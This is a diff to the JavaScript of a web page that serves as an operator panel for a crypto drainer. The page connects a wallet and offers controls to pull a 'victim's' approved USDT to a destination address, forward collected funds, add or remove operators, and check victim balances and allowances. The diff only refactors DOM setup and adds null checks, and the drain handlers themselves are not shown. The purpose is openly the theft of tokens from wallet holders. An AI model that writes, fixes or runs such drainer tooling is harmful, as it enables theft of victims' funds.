@@ -115,44 +115,50 @@
         // --- GLOBAL VARIABLES ---
         let currentConnectedAccount = null;
 
-        // --- DOM ELEMENTS ---
-        const connectWalletBtn = document.getElementById('connectWalletBtn');
-        const pullUsdtBtn = document.getElementById('pullUsdtBtn');
-        const forwardCollectedBtn = document.getElementById('forwardCollectedBtn');
-        const addOperatorBtn = document.getElementById('addOperatorBtn');
-        const removeOperatorBtn = document.getElementById('removeOperatorBtn');
-        const getContractInfoBtn = document.getElementById('getContractInfoBtn');
-        const checkVictimBalanceBtn = document.getElementById('checkVictimBalanceBtn');
+        // --- DOM ELEMENTS (Declared inside load listener for safety) ---
+        let connectWalletBtn;
+        let pullUsdtBtn;
+        let forwardCollectedBtn;
+        let addOperatorBtn;
+        let removeOperatorBtn;
+        let getContractInfoBtn;
+        let checkVictimBalanceBtn;
 
-        const walletAddressDisplay = document.getElementById('walletAddressDisplay');
-        const networkDisplay = document.getElementById('networkDisplay');
-        const victimAddressDrainInput = document.getElementById('victimAddressDrain');
-        const destinationAddressDrainInput = document.getElementById('destinationAddressDrain');
-        const forwardToAddressInput = document.getElementById('forwardToAddress');
-        const operatorAddressInput = document.getElementById('operatorAddress');
-        const statusDiv = document.getElementById('status');
+        let walletAddressDisplay;
+        let networkDisplay;
+        let victimAddressDrainInput;
+        let destinationAddressDrainInput;
+        let forwardToAddressInput;
+        let operatorAddressInput;
+        let statusDiv;
 
-        const victimUSDTBalanceDisplay = document.getElementById('victimUSDTBalance');
-        const victimAllowanceDisplay = document.getElementById('victimAllowance');
-        const amountToPullDisplay = document.getElementById('amountToPullDisplay');
+        let victimUSDTBalanceDisplay;
+        let victimAllowanceDisplay;
+        let amountToPullDisplay;
 
-        const displayOwner = document.getElementById('displayOwner');
-        const displayUSDTBalance = document.getElementById('displayUSDTBalance');
-        const displayUSDTTokenAddress = document.getElementById('displayUSDTTokenAddress');
+        let displayOwner;
+        let displayUSDTBalance;
+        let displayUSDTTokenAddress;
+
 
         // --- HELPER FUNCTIONS ---
         function setStatus(message, type = 'info') {
-            statusDiv.className = `status-message ${type}`;
-            statusDiv.textContent = message;
+            if (statusDiv) { // Ensure statusDiv is available
+                statusDiv.className = `status-message ${type}`;
+                statusDiv.textContent = message;
+            } else {
+                console.warn("Status div not found, message:", message);
+            }
         }
 
         function toggleButtons(enable) {
-            pullUsdtBtn.disabled = !enable;
-            forwardCollectedBtn.disabled = !enable;
-            addOperatorBtn.disabled = !enable;
-            removeOperatorBtn.disabled = !enable;
-            getContractInfoBtn.disabled = !enable;
-            checkVictimBalanceBtn.disabled = true; // Always disabled as it needs ethers.js
+            // Ensure all buttons are loaded before attempting to disable them
+            if (pullUsdtBtn) pullUsdtBtn.disabled = !enable;
+            if (forwardCollectedBtn) forwardCollectedBtn.disabled = !enable;
+            if (addOperatorBtn) addOperatorBtn.disabled = !enable;
+            if (removeOperatorBtn) removeOperatorBtn.disabled = !enable;
+            if (getContractInfoBtn) getContractInfoBtn.disabled = !enable;
+            if (checkVictimBalanceBtn) checkVictimBalanceBtn.disabled = true; // Always disabled as it needs ethers.js
         }
 
         function getNetworkName(chainIdHex) {
@@ -183,11 +189,11 @@
                     const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                     const networkName = getNetworkName(chainId);
 
-                    walletAddressDisplay.textContent = `Connected: ${currentConnectedAccount}`;
-                    networkDisplay.textContent = `Network: ${networkName}`;
+                    if (walletAddressDisplay) walletAddressDisplay.textContent = `Connected: ${currentConnectedAccount}`;
+                    if (networkDisplay) networkDisplay.textContent = `Network: ${networkName}`;
                     
-                    destinationAddressDrainInput.value = currentConnectedAccount;
-                    forwardToAddressInput.value = currentConnectedAccount;
+                    if (destinationAddressDrainInput) destinationAddressDrainInput.value = currentConnectedAccount;
+                    if (forwardToAddressInput) forwardToAddressInput.value = currentConnectedAccount;
 
                     setStatus("Wallet connected. Functionality is limited without ethers.js.", 'info');
                     toggleButtons(true);
@@ -195,8 +201,8 @@
                 } catch (error) {
                     console.error("Error connecting wallet:", error);
                     setStatus(`Error connecting wallet: ${error.message || "Unknown error"}`, 'error');
-                    walletAddressDisplay.textContent = "Status: Not Connected";
-                    networkDisplay.textContent = "Network: Unknown";
+                    if (walletAddressDisplay) walletAddressDisplay.textContent = "Status: Not Connected";
+                    if (networkDisplay) networkDisplay.textContent = "Network: Unknown";
                     toggleButtons(false);
                     currentConnectedAccount = null;
                 }
@@ -303,51 +309,78 @@
 
         async function getContractInfo() {
             // Cannot read contract state without ethers.js.
-            displayOwner.textContent = "Not Available (requires ethers.js)";
-            displayUSDTBalance.textContent = "Not Available (requires ethers.js)";
-            displayUSDTTokenAddress.textContent = "Not Available (requires ethers.js)";
+            if (displayOwner) displayOwner.textContent = "Not Available (requires ethers.js)";
+            if (displayUSDTBalance) displayUSDTBalance.textContent = "Not Available (requires ethers.js)";
+            if (displayUSDTTokenAddress) displayUSDTTokenAddress.textContent = "Not Available (requires ethers.js)";
             setStatus("Cannot retrieve contract info in this limited mode.", 'info');
         }
 
         async function checkVictimBalanceAndAllowance() {
             // Cannot read ERC20 balances/allowances without ethers.js.
-            victimUSDTBalanceDisplay.textContent = "Not Available (requires ethers.js)";
-            victimAllowanceDisplay.textContent = "Not Available (requires ethers.js)";
-            amountToPullDisplay.textContent = "Not Available (requires ethers.js)";
+            if (victimUSDTBalanceDisplay) victimUSDTBalanceDisplay.textContent = "Not Available (requires ethers.js)";
+            if (victimAllowanceDisplay) victimAllowanceDisplay.textContent = "Not Available (requires ethers.js)";
+            if (amountToPullDisplay) amountToPullDisplay.textContent = "Not Available (requires ethers.js)";
             setStatus("Cannot check victim's balance or allowance in this limited mode.", 'info');
-            pullUsdtBtn.disabled = true; // Keep disabled as we can't verify pre-conditions
+            toggleButtons(false); // Keep disabled as we can't verify pre-conditions
         }
 
 
         // --- EVENT LISTENERS ---
-        connectWalletBtn.addEventListener('click', connectWallet);
-        pullUsdtBtn.addEventListener('click', handlePullUsdt);
-        forwardCollectedBtn.addEventListener('click', handleForwardCollected);
-        addOperatorBtn.addEventListener('click', handleAddOperator);
-        removeOperatorBtn.addEventListener('click', handleRemoveOperator);
-        getContractInfoBtn.addEventListener('click', getContractInfo);
-        checkVictimBalanceBtn.addEventListener('click', checkVictimBalanceAndAllowance);
-
-        // Initial setup on page load
+        // Initialize DOM elements and attach event listeners once the page is loaded
         window.addEventListener('load', () => {
+            // Assign DOM elements to variables
+            connectWalletBtn = document.getElementById('connectWalletBtn');
+            pullUsdtBtn = document.getElementById('pullUsdtBtn');
+            forwardCollectedBtn = document.getElementById('forwardCollectedBtn');
+            addOperatorBtn = document.getElementById('addOperatorBtn');
+            removeOperatorBtn = document.getElementById('removeOperatorBtn');
+            getContractInfoBtn = document.getElementById('getContractInfoBtn');
+            checkVictimBalanceBtn = document.getElementById('checkVictimBalanceBtn');
+
+            walletAddressDisplay = document.getElementById('walletAddressDisplay');
+            networkDisplay = document.getElementById('networkDisplay');
+            victimAddressDrainInput = document.getElementById('victimAddressDrain');
+            destinationAddressDrainInput = document.getElementById('destinationAddressDrain');
+            forwardToAddressInput = document.getElementById('forwardToAddress');
+            operatorAddressInput = document.getElementById('operatorAddress');
+            statusDiv = document.getElementById('status');
+
+            victimUSDTBalanceDisplay = document.getElementById('victimUSDTBalance');
+            victimAllowanceDisplay = document.getElementById('victimAllowance');
+            amountToPullDisplay = document.getElementById('amountToPullDisplay');
+
+            displayOwner = document.getElementById('displayOwner');
+            displayUSDTBalance = document.getElementById('displayUSDTBalance');
+            displayUSDTTokenAddress = document.getElementById('displayUSDTTokenAddress');
+
+            // Attach event listeners
+            connectWalletBtn.addEventListener('click', connectWallet);
+            pullUsdtBtn.addEventListener('click', handlePullUsdt);
+            forwardCollectedBtn.addEventListener('click', handleForwardCollected);
+            addOperatorBtn.addEventListener('click', handleAddOperator);
+            removeOperatorBtn.addEventListener('click', handleRemoveOperator);
+            getContractInfoBtn.addEventListener('click', getContractInfo);
+            checkVictimBalanceBtn.addEventListener('click', checkVictimBalanceAndAllowance);
+
+            // Initial setup
             toggleButtons(false); // Disable buttons initially
             if (typeof window.ethereum !== 'undefined') {
                 // Listen for account changes
                 window.ethereum.on('accountsChanged', (accounts) => {
                     if (accounts.length === 0) {
                         setStatus("Wallet disconnected.", 'info');
-                        walletAddressDisplay.textContent = "Status: Not Connected";
-                        networkDisplay.textContent = "Network: Unknown";
+                        if (walletAddressDisplay) walletAddressDisplay.textContent = "Status: Not Connected";
+                        if (networkDisplay) networkDisplay.textContent = "Network: Unknown";
                         toggleButtons(false);
                         currentConnectedAccount = null;
                         // Clear victim info
-                        victimAddressDrainInput.value = "";
-                        destinationAddressDrainInput.value = "";
-                        forwardToAddressInput.value = "";
-                        operatorAddressInput.value = "";
-                        victimUSDTBalanceDisplay.textContent = "N/A";
-                        victimAllowanceDisplay.textContent = "N/A";
-                        amountToPullDisplay.textContent = "N/A";
+                        if (victimAddressDrainInput) victimAddressDrainInput.value = "";
+                        if (destinationAddressDrainInput) destinationAddressDrainInput.value = "";
+                        if (forwardToAddressInput) forwardToAddressInput.value = "";
+                        if (operatorAddressInput) operatorAddressInput.value = "";
+                        if (victimUSDTBalanceDisplay) victimUSDTBalanceDisplay.textContent = "N/A";
+                        if (victimAllowanceDisplay) victimAllowanceDisplay.textContent = "N/A";
+                        if (amountToPullDisplay) amountToPullDisplay.textContent = "N/A";
                     } else {
                         connectWallet(); // Reconnect to update info
                     }
